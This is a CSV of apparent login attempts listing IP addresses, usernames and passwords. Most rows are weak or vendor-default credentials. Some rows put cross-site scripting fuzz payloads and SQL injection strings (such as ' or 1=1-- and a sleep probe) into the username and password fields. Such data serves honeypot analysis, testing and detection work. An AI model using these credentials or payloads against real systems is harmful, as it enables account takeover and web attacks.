ip,username,password
138.216.231.94,zhuo,gordon-tsd1
48.221.223.219,"<IMG LOWSRC=""javascript:alert(740)"">","<frameset onFocus frameset onFocus=""javascript:javascript:alert(315)""></frameset onFocus>"
50.181.52.172,gong,+l23456789o
0.216.195.253,ran,please1%
120.105.203.196,diao,1a2b3c4d*
241.95.72.212,xin,1/4dream
1.130.135.34,!,%27%20or%201=1
61.227.192.135,messagebus,SYSMAINT
153.152.107.111,seng,VKizsj6NG*9a
158.73.221.133,intel,HLW
48.221.223.219,"<a href=""javas\x04cript:javascript:alert(373)"" id=""fuzzelement373"">test</a>","""`'><script>\xE2\x80\xA9javascript:alert(1423)</script>"
138.216.231.94,zhuo,gordon-tsd1
50.181.52.172,gong,+l23456789o
0.216.195.253,ran,please1%
120.105.203.196,diao,1a2b3c4d*
241.95.72.212,xin,1/4dream
1.130.135.34,*|,PRINT
61.227.192.135,messagebus,12345678
153.152.107.111,seng,VKizsj6NG*9a
158.73.221.133,intel,bagabu
138.216.231.94,zhuo,gordon-tsd1
48.221.223.219,<IMG SRC=javascript:alert(1631)>,"';alert(860))//\';alert(860))//"";alert(860))//\"";alert(860))//--></SCRIPT>"">'><SCRIPT>alert(860))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search"
0.216.195.253,ran,please1%
120.105.203.196,diao,1a2b3c4d*
50.181.52.172,gong,+l23456789o
241.95.72.212,xin,1/4deam
61.227.192.135,messagebus,installer
1.130.135.34,exec sp,' or uname like '%
153.152.107.111,seng,VKizsj6NG*9a
138.216.231.94,zhuo,gordon-tsd1
158.73.221.133,intel,CDEMO82
48.221.223.219,"`""'><img src=xxx:x onerror\x0A=javascript:alert(1473)>",<? echo('<SCR)';echo('IPT>alert(1680)</SCRIPT>'); ?>
0.216.195.253,ran,please1%
120.105.203.196,diao,1a2b3c4d*
50.181.52.172,gong,+l23456789o
241.95.72.212,xin,1/4dream
1.130.135.34,' or 1=1--,*|
153.152.107.111,seng,VKizsj6NG*9a
61.227.192.135,messagebus,bravo_2008
138.216.231.94,zhuo,gordon-tsd1
158.73.221.133,intel,!1fw@2soc#3v-p-n
48.221.223.219,"<script\x3Etype=""text/javascript"">javascript:alert(1300);</script>","<STYLE. TYPE=""text/css"">.XSS{background-image:url(""javascript.:alert(263)"");}</STYLE><A CLASS=XSS></A>"
0.216.195.253,ran,please1%
120.105.203.196,diao,1a2b3c4d*
50.181.52.172,gong,+l2@456789o
241.95.72.212,xin,1/4dream
1.130.135.34,') and ('x'='x,",@variable"
61.227.192.135,messagebus,BIOS
153.152.107.111,seng,VKizsj6NG*9a
48.221.223.219,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert(1049);+ADw-/SCRIPT+AD4-","<a href=""\x0Ejavascript:javascript:alert(446)"" id=""fuzzelement446"">test</a>"
138.216.231.94,zhuo,gordon-tsd1
158.73.221.133,intel,Aa868686
50.181.52.172,gong,+l23456789o
0.216.195.253,ran,please1%
120.105.203.196,diao,1a2b3c4d*
241.95.72.212,xin,1/4dream
153.152.107.111,seng,VKizsj6NG*9a
1.130.135.34,or,desc
61.227.192.135,messagebus,EltakoFVS
48.221.223.219,<<SCRIPT>alert(1647);//<</SCRIPT>,<script>javascript:alert(355)</script\x0A
138.216.231.94,zhuo,gordon-csd1
158.73.221.133,ftp_admi,111111
50.181.52.172,gong,+l23456789o
120.105.203.196,diao,1a2b3c4d*
0.216.195.253,ran,please1%
241.95.72.212,xin,1/4dream
153.152.107.111,seng,VKizsj6NG*9a
61.227.192.135,messagebus,Wo#a*Vk%._88
1.130.135.34,!,‘ or 1=1 --
158.73.221.133,ftp_admi,asd123
48.221.223.219,"<script\x3Etype=""text/javascript"">javascript:alert(401);</script>",&lt;SCRIPT&gt;alert(1805)&lt;/SCRIPT&gt;
138.216.231.94,zhuo,gordo-tsd1
50.181.52.172,gong,~+l23456789o
0.216.195.253,ran,please1%
120.105.203.196,diao,1a2b3c4d*
241.95.72.212,xin,1/4dream
61.227.192.135,status,changeit
1.130.135.34,&,= '
153.152.107.111,seng,VKizsj6NG*9a
158.73.221.133,ftp_admi,l3
48.221.223.219,<body/onload=&lt;!--&gt;&#8300alert(830)>,"<BASE HREF=""javascript:alert(1046);//"">"
138.216.231.94,zhuo,gordon-tsd1
120.105.203.196,diao,1a2b3c4d*
0.216.195.253,ran,plese1%
50.181.52.172,gong,+l23456789o
241.95.72.212,xin,1/4dream
1.130.135.34,%20'sleep%2050',distinct
61.227.192.135,status,d1scovery
153.152.107.111,seng,VKizsj6NG*9a
48.221.223.219,"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(302)""></body onPropertyChange>",--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1259)> -->
158.73.221.133,ftp_admi,guest*PWD
138.216.231.94,zhuo,gordon-tsd1
0.216.195.253,ju,~!@abc123
50.181.52.172,gong,+l23456789o
120.105.203.196,diao,1a2b3c4d*
241.95.72.212,xin,1/4dream
153.152.107.111,seng,VKizsj6NG*9a
30.81.145.230,mao,asdfjkl;33
61.227.192.135,status,911
138.216.231.94,zhuo,gordon-tsd1
158.73.221.133,ftp_admi,1qaz2wsx
48.221.223.219,<object type=text/html data='javascript.:alert(15);'></object>,"""/><img/onerror=\x0Bjavascript:alert(538)\x0Bsrc=xxx:x />"
0.216.195.253,ju,~!@abc123
50.181.52.172,gong,+l23456789o
120.105.203.196,diao,1a2b3c4d*
241.95.72.212,xin,1/4dream
61.227.192.135,status,xc3511
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001@163.com
158.73.221.133,SQLUSER,changeme2
48.221.223.219,"<IMG SRC=x onwheel=""alert(1094))"">","<STYLE>.XSS{background-image:url(""javascript:alert(750)"");}</STYLE><A CLASS=XSS></A>"
138.216.231.94,zhuo,gordon-tsd1
0.216.195.253,ju,~!@abc123
120.105.203.196,diao,1a2b3c4d*
50.181.52.172,gong,+l23456789o
241.95.72.212,xin,1/4dream
61.227.192.135,status,d
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001@163.com
48.221.223.219,"<script src=""data:text/plain\x2Cjavascript:alert(396)""></script>","<a href=""\x03javascript:javascript:alert(445)"" id=""fuzzelement445"">test</a>"
158.73.221.133,SQLUSER,amigosw1
138.216.231.94,zhuo,gordon-tsd1
50.181.52.172,gong,+l23456789o
120.105.203.196,diao,1a2b3c4d*
0.216.195.253,ju,~!@abc123
241.95.72.212,xin,1/4dream
153.152.107.111,ai,001@163.com
30.81.145.230,mao,asdfjkl;33
61.227.192.135,status,admin*PWD
158.73.221.133,SQLUSER,kronites
48.221.223.219,<input onfocus=javascript:alert(1477) autofocus>,<brute ondblclick=alert(178)>double click this!
138.216.231.94,zhuo,gordontsd1
120.105.203.196,diao,1:a2b3c4d*
50.181.52.172,gong,+l23456789o
0.216.195.253,ju,~!@abc123
241.95.72.212,xin,1/4dr%am
30.81.145.230,mao,asdfjkl;33
61.227.192.135,status,custpw
153.152.107.111,ai,001@163.com
158.73.221.133,SQLUSER,acc
48.221.223.219,"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1223)""></xml onPropertyChange>","<;IMG "";"";"";>;<;SCRIPT>;alert(1926)<;/SCRIPT>;"";>;"
97.228.53.161,lu,asdfjkl;8
0.216.195.253,ju,~!@abc123
120.105.203.196,diao,1a2b34d*
50.181.52.172,gong,+l23|56789o
241.95.72.212,xin,1/4dream
61.227.192.135,comcast,firewall
153.152.107.111,ai,001@163.com
30.81.145.230,mao,Zsdfjkl;33
97.228.53.161,lu,asdfjkl;8
48.221.223.219,</script><script>alert(1016);</script>,<svg><a xmlns:xlink=http://www.w3.org/220999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(220) to=%26>
158.73.221.133,SQLUSER,dasusr1
0.216.195.253,ju,~!@abc123
120.105.203.196,diao,1a2b3c4d*
50.181.52.172,gong,+l23456789o
241.95.72.212,xin,1/4dream
61.227.192.135,comcast,OCS
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001@163.com
158.73.221.133,SQLUSER,netxms
48.221.223.219,<frameset onload=javascript:alert(1487)>,"<!--<img src=""--><img src=x onerror=alert(961)//"">"
97.228.53.161,lu,asdfjkl;8
50.181.52.172,gong,+l23456789o
0.216.195.253,ju,~!@abc123
120.105.203.196,diao,1a2b3c4d*
241.95.72.212,xin,1/4dream
61.227.192.135,comcast,456123
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001@163.com
89.238.118.166,"""/><img/onerror=\x22javascript:alert(539)\x22src=xxx:x />",</XSS STYLE=xss:expression(alert(1872))>
97.228.53.161,lu,asdfjkl;8
158.73.221.133,SQLUSER,123456789
120.105.203.196,diao,1a2b3c4d*
0.216.195.253,ju,~!@abc123
50.181.52.172,gong,+l234567V9o
241.95.72.212,xin,1/4dream
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001@163.com
61.227.192.135,comcast,changeme!
97.228.53.161,lu,asdfjkl;8
158.73.221.133,dhs3pms,primos
89.238.118.166,"<a href=""\xE2\x80\x86javascript:javascript:alert(469)"" id=""fuzzelement469"">test</a>","""`'><script>\xE2\x80\x85javascript:alert(509)</script>"
50.181.52.172,gong,+l23456789o
120.105.203.196,diao,1a2b3c4d*
0.216.195.253,ju,~!@abc123
241.95.72.212,xin,1/4dream
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001163.com
61.227.192.135,comcast,xampp
89.238.118.166,"<a href=""\x4398javascript:javascript:alert(439)"" id=""fuzzelement439"">test</a>",&lt;/script&gt;&lt;script&gt;alert(1859)&lt;/script&gt;
97.228.53.161,lu,asdfjkl;8
158.73.221.133,dhs3pms,NETBASE
0.216.195.253,ju,~@abc123
120.105.203.196,diao,1a2b3c4d*
50.181.52.172,gong,+l23456789o
241.95.72.212,xin,1/4dream
153.152.107.111,ai,001@163.com
61.227.192.135,comcast,wlsedb
30.81.145.230,mao,asdfjkl;33
158.73.221.133,dhs3pms,USERP
89.238.118.166,"&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058;alert(887);\""&gt;",<IMG SRC=javascript:alert(995)>
97.228.53.161,lu,asdfjkl;
13.10.218.52,"<a href=""\x01365javascript:javascript:alert(1365)"" id=""fuzzelement1365"">test</a>","<XML SRC=""javascript.:alert(268);"">"
0.216.195.253,ju,~!@abc123
120.105.203.196,gong,ctrl@126.com
241.95.72.212,xin,1/4dream
30.81.145.230,mao,asdfjkl;33
61.227.192.135,comcast,super
153.152.107.111,ai,001@163.com
158.73.221.133,dhs3pms,ISPMODE
97.228.53.161,lu,asdfjkl;8
89.238.118.166,"<script\x09type=""text/javascript"">javascript:alert(403);</script>","`""'><img src=xxx:x \x00onerror=javascript:alert(498)>"
0.216.195.253,ju,~!@abc123
120.105.203.196,gong,ctrl@126.com
13.10.218.52,"""/><img/onerror=\x0Djavascript:alert(544)\x0Dsrc=xxx:x />","<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1593);"">"
241.95.72.212,mo,X-rated2419
61.227.192.135,comcast,BRIO_ADMIN
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001@163.com
158.73.221.133,dhs3pms,Admin_123
97.228.53.161,lu,asPdfjkl;8
89.238.118.166,&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(1828))&quot;&gt;,"<IMG SRC=""javascript.:alert(271)"""
120.105.203.196,gong,ctrl@126.com
0.216.195.253,ju,~!@abc123
13.10.218.52,"<svg onLoad svg onLoad=""javascript:javascript:alert(303)""></svg onLoad>","<a href=""\x13437javascript:javascript:alert(1343)"" id=""fuzzelement1343"">test</a>"
241.95.72.212,mo,X-rated2419
61.227.192.135,comcast,EMP
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001@163.com
158.73.221.133,dhs3pms,PrOw!aN_fXp
97.228.53.161,lu,asdfjkl;8
89.238.118.166,"""`'><script>\x0Djavascript:alert(502)</script>",<BODY ONLOAD=alert(850)>
120.105.203.196,gong,ctrl@126.com
0.216.195.253,ju,~!@abc123
13.10.218.52,"""<IMG src=""/java""\0script.:alert(241)>"";'>out",<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(1865))>
241.95.72.212,mo,X-rated2419
61.227.192.135,comcast,Harbor12345
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001@163.com
89.238.118.166,<SCRIPT> alert(1792); </SCRIPT>,&lt;IMG SRC=&quot;javascript:alert(1817);&quot;&gt;
158.73.221.133,dhs3pms,PROG
97.228.53.161,lu,asdfjkl;8
13.10.218.52,<;/TITLE>;<;SCRIPT>;alert(1914);<;/SCRIPT>;,"<object onError object onError=""javascript:javascript:alert(1230)""></object onError>"
0.216.195.253,ju,~!@abc123
120.105.203.196,gong,ctrl@126.com
241.95.72.212,mo,X-rated2419
61.227.192.135,sqlserver,soccer
153.152.107.111,ai,001@163.com
30.81.145.230,mao,asdfjkl;33
97.228.53.161,lu,asdfjkl;8
89.238.118.166,"<script\x20type=""text/javascript"">javascript:alert(278);</script>","<IMG SRC=""javascript:javascript:alert(662);"">"
158.73.221.133,dhs3pms,mq123456
0.216.195.253,ju,~!@abc123
120.105.203.196,gong,ctrl@126.com
13.10.218.52,"<BASE HREF=""javascript:alert(1762);//"">","<IFRAME SRC=""javascript:alert(1136);""></IFRAME>"
241.95.72.212,mo,X-rated2419
61.227.192.135,sqlserver,author
153.152.107.111,ai,001@163.com
30.81.145.230,mao,adfjkl;33
89.238.118.166,"<img src=x onerror=\x15410""javascript:alert(1541)"">","<iframe/src=""data:text/html,<svg &#168516851685;&#168516850;load=alert(1685)>"">"
97.228.53.161,lu,asdfjkl;8
158.73.221.133,dhs3pms,PORTAL30_SSO_PS
0.216.195.253,ju,~!@abc123
13.10.218.52,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert(1035);"">",</TITLE><SCRIPT>alert(1650);</SCRIPT>
120.105.203.196,gong,ctrl@126.com
241.95.72.212,mo,X-rated2419
61.227.192.135,sqlserver,biosstar
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001@163.com
89.238.118.166,<img src=`xx:xx`onerror=alert(827)>,"</textarea>'""><script>alert(1766)</script>"
158.73.221.133,dhs3pms,rw
97.228.53.161,lu,asdfjkl;8
13.10.218.52,"<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#15741574;src=x:x&#15741574;onerror&#15741574;=javascript:alert(1574)&gt;"">","<a href=""javascript\x0D:javascript:alert(489)"" id=""fuzzelement489"">test</a>"
0.216.195.253,ju,~!@abc123
120.105.203.196,gong,ctrl@126.com
241.95.72.212,mo,X-rated2419
61.227.192.135,sqlserver,ORASSO
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001@163.com
97.228.53.161,lu,asdfjkl;8
158.73.221.133,adminttd,conexant
89.238.118.166,"<IMG SRC=x ondrag=""alert(1095))"">","`""'><img src='#\x27 onerror=javascript:alert(1262)>"
0.216.195.253,ju,~!@abc123
120.105.203.196,gong,ctrl@126.com
13.10.218.52,X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1567)` >,"""><img src=x onerror=javascript:alert(1460)>"
241.95.72.212,mo,X-rate2419
61.227.192.135,sqlserver,kilo1987
153.152.107.111,ai,001@163.com
30.81.145.230,mao,asdfjkl;33
158.73.221.133,adminttd,Abc123!@#
89.238.118.166,"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1221)""></html onMouseDown>",<script>1748 1748 = 1; alert(1748)</script>
97.228.53.161,lu,asdfjkl;8
13.10.218.52,"<DIV STYLE=""background-image: url(javascript:javascript:alert(683))"">",¼script¾alert(1668)¼/script¾
0.216.195.253,ju,~!@Qabc123
120.105.203.196,gong,ctrl@126.com
241.95.72.212,mo,X-rated2419
61.227.192.135,sqlserver,joeuser
30.81.145.230,mao,asdfjkl;33
153.152.107.111,ai,001@163.com
97.228.53.161,lu,asdfjkl;8
89.238.118.166,http://www.google<script .com>alert(774)</script,&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(1845);&lt;/SCRIPT&gt;
158.73.221.133,adminttd,0
120.105.203.196,gong,ctrl@126.com
13.10.218.52,"""<IMG src=""/java""\0script.:alert(241)>"";'>out","<img \x47src=x onerror=""javascript:alert(608)"">"
0.216.195.253,ju,~!@abc123
241.95.72.212,mo,X-rated2419
61.227.192.135,sqlserver,pw
176.214.205.95,"<a href=""\xE2\x80\x88javascript:javascript:alert(441)"" id=""fuzzelement441"">test</a>",&lt;SCRIPT&gt;alert(877)&lt;/SCRIPT&gt;
30.81.145.230,mao,asdfjkl;33
89.238.118.166,"<IMG SRC=x onbeforeunload=""alert(1061))"">","<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert(756);"">"
158.73.221.133,adminttd,wrgg15_di524
97.228.53.161,lu,asdfjkl;8
13.10.218.52,veris-->group<svg/onload=alert(1051)//,"';alert(1625))//';alert(1625))//"";"
120.105.203.196,gong,ctrl@126.com
0.216.195.253,ju,~!@abc123
241.95.72.212,mo,X-rated2419
61.227.192.135,sqlserver,INVALID
30.81.145.230,mao,asdfjkl;33
176.214.205.95,"<a href=""\x0Cjavascript:javascript:alert(474)"" id=""fuzzelement474"">test</a>","&#00;</form><input type&#61154;""date"" onfocus=""alert(1154)"">"
97.228.53.161,lu,asdfjkl;8
158.73.221.133,adminttd,daniel
89.238.118.166,medium--> Ë«Ð´ÈÆ¹ý£º<sc<script>ript>alert(4)</script>,"<script\x20type=""text/javascript"">javascript:alert(1177);</script>"
13.10.218.52,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert(1032)"")}</STYLE>",<form><button formaction=javascript&colon;alert(838)>CLICKME
196.216.212.2,fei,c000*000
120.105.203.196,gong,ctrl@126.com
241.95.72.212,mo,X-rateUd2419
61.227.192.135,polkituser,WORD
176.214.205.95,"""/><img/onerror=\x20javascript:alert(546)\x20src=xxx:x />",javascript:alert(853)
30.81.145.230,mao,asdfjkl;33
158.73.221.133,adminttd,guest1
89.238.118.166,"<form><iframe &#09;&#11500;&#11501150; src=""javascript&#58;alert(1150)""&#11501150;&#11500;&#09;;>","<img src\x00=x onerror=""javascript:alert(618)"">"
97.228.53.161,lu,asdfjkl;8
196.216.212.2,fei,c000*000
13.10.218.52,"<comment><img src=""</comment><img src=x onerror=javascript:alert(1490))//"">","<;IMG SRC="";javascript:alert(1924)"";"
120.105.203.196,gong,ctrl@126.com
241.95.72.212,mo,X-rated2419
61.227.192.135,polkituser,jvbzd
30.81.145.230,mao,asdfjkl;33
176.214.205.95,<img src ?itworksonchrome?\/onerror = alert(793),"<IMG SRC=x onended=""alert(1112))"">"
158.73.221.133,adminttd,qsysopr
89.238.118.166,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1646)>","<IMG SRC=x onmousewheel=""alert(1093))"">"
97.228.53.161,lu,asdfjkl;8
120.105.203.196,gong,ctrl@126.com
196.216.212.2,fei,c000*000
13.10.218.52,<script>javascript:alert(661)</script>,%253cscript%253ealert(845)%253c/script%253e
241.95.72.212,mo,X-rated2419
61.227.192.135,polkituser,OkiLAN
176.214.205.95,"<BR SIZE=""&{alert(1658)}"">",<form><input formaction=javascript:alert(209) type=image src=http://brutelogic.com.br/webgun/img/youtube209.jpg>
30.81.145.230,mao,asdfjkl;33
97.228.53.161,lu,#asdfjkl;8
158.73.221.133,adminttd,VCSRV
89.238.118.166,"<a href=""javas\x0Acript:javascript:alert(1268)"" id=""fuzzelement1268"">test</a>",<IMG SRC=JaVaScRiPt:alert(1630)>
13.10.218.52,"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1392)>",<script>alert(1712);</script>
196.216.212.2,fei,c000*000
120.105.203.196,gong,ctrl@126.com
241.95.72.212,mo,X-rated2419
61.227.192.135,polkituser,teX1
176.214.205.95,<SCRIPT>a=/XSS/alert(942)</SCRIPT>,"<a href=""javascript:javascript:alert(1573)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"">"
30.81.145.230,mao,asdfjl;33
158.73.221.133,adminttd,firewall
89.238.118.166,<OBJECT classid=clsid:ae24fdae-03c6-16061606d1606-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1606)></OBJECT>,"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(710)&amp;gt;>"">"
97.228.53.161,lu,adfjkl;8
196.216.212.2,fei,c000*000
120.105.203.196,gong,ctrl@126.com
13.10.218.52,<IMG SRC=”jav ascript:alert(842);”>,"&#00;</form><input type&#61691;""date"" onfocus=""alert(1691)"">"
241.95.72.212,mo,X-rated2419
61.227.192.135,polkituser,LINK
176.214.205.95,"""><SCRIPT>alert(1786))</SCRIPT><img src="""" alt=""","<TABLE><TD BACKGROUND=""javascript:javascript:alert(682)"">"
30.81.145.230,liang,please1%
158.73.221.133,adminttd,ESTORE
97.228.53.161,lu,asdfjkl;8
89.238.118.166,</TITLE><SCRIPT>alert(1650);</SCRIPT>,"ABC<div style=""x:exp\x00ression(javascript:alert(410)"">DEF"
13.10.218.52,"&lt;IMG LOWSRC=\""javascript&#058;alert(884)\""&gt;","<img src=x onerror=\x15410""javascript:alert(1541)"">"
196.216.212.2,fei,c000*000
120.105.203.196,gong,ctrl@126.com
241.95.72.212,mo,X-rated2419
61.227.192.135,polkituser,basisk
176.214.205.95,"<;IMG SRC="";javascript:alert(1924)"";","<a href=""javas\x07cript:javascript:alert(367)"" id=""fuzzelement367"">test</a>"
30.81.145.230,liang,please1%
158.73.221.133,**23646,FORSE
89.238.118.166,<IMG SRC=javascript:alert(1962))>,"<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1353)"" id=""fuzzelement1353"">test</a>"
97.228.53.161,lu,asdfjkl;8
13.10.218.52,<div style=width:1504px;filter:glow onfilterchange=javascript:alert(1504)>x,"<a href=""javas\x06cript:javascript:alert(1277)"" id=""fuzzelement1277"">test</a>"
196.216.212.2,fei,c000*000
120.105.203.196,gong,ctrl@126.com
241.95.72.212,mo,X-rated241M9
61.227.192.135,polkituser,OP.OPERATOR
176.214.205.95,<script x> alert(1172) </script 1172=2,"<TABLE BACKGROUND=""javascript:javascript:alert(1595)"">"
30.81.145.230,liang,please1%
97.228.53.161,lu,asdfjkl;8
158.73.221.133,**23646,Tasmannet
89.238.118.166,"<STYLE. type=""text/css"">BODY{background:url(""javascript.:alert(264)"")}</STYLE>","<img src=""javas&#99;ript:alert(226)"">"
196.216.212.2,fei,c000*000
120.105.203.196,gong,ctrl@126.com
13.10.218.52,<sCR<script>iPt>alert(1056)</SCr</script>IPt>,"<a href=""\x1384Cjavascript:javascript:alert(1384)"" id=""fuzzelement1384"">test</a>"
241.95.72.212,mo,X-rated2419
61.227.192.135,polkituser,eTIPS123
176.214.205.95,"<a href=""\x09javascript:javascript:alert(453)"" id=""fuzzelement453"">test</a>","<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert(1670);"">"
30.81.145.230,liang,please1%
89.238.118.166,<img src=`%00`&NewLine; onerror=alert(808)&NewLine;,"""`'><script>\xE2\x80\x83javascript:alert(527)</script>"
158.73.221.133,**23646,siteadmin
97.228.53.161,lu,asdfjkl;8
13.10.218.52,"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1564)}),x</script>","<image src=""javascript:alert(1502)"">"
196.216.212.2,fei,c000*000
120.105.203.196,gong,ctrl@126.com
241.95.72.212,mo,X-rated2419
61.227.192.135,polkituser,BPMS
176.214.205.95,<IMG SRC=javascript:alert(1629)>,"""`'><script>\xE2\x8523\x9Fjavascript:alert(523)</script>"
30.81.145.230,liang,please1%
89.238.118.166,"<IMG SRC= onmouseover=""alert(1004)"">","<form id=""test"" /><button form=""test"" formaction=""javascript:alert(958)"">TESTHTML5FORMACTION"
97.228.53.161,lu,asdfjkl;8
158.73.221.133,**23646,Changeme_123
120.105.203.196,gong,ctrl@126.com
196.216.212.2,fei,c000*000
13.10.218.52,"<applet onError applet onError=""javascript:javascript:alert(316)""></applet onError>","<;STYLE TYPE="";text/javascript"";>;alert(1896);<;/STYLE>;"
241.95.72.212,mo,X-rated2419
240.64.44.178,"<img src=""javascript:alert(854);"">","""`'><script>\x7Ejavascript:alert(1420)</script>"
30.81.145.230,liang,please1%
176.214.205.95,"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(308)""></bgsound onPropertyChange>","<% foo><x foo=""%><script>alert(875)</script>"">"
158.73.221.133,**23646,draadloos
89.238.118.166,"<html onmousemove html onmousemove=""javascript:javascript:alert(350)""></html onmousemove>","<img src=x\x15383onerror=""javascript:alert(1538)"">"
97.228.53.161,lu,asdfjkl;8
196.216.212.2,fei,c000*000
13.10.218.52,"ABC<div style=""x:exp\x5Cression(javascript:alert(411)"">DEF","<img \x34src=x onerror=""javascript:alert(1523)"">"
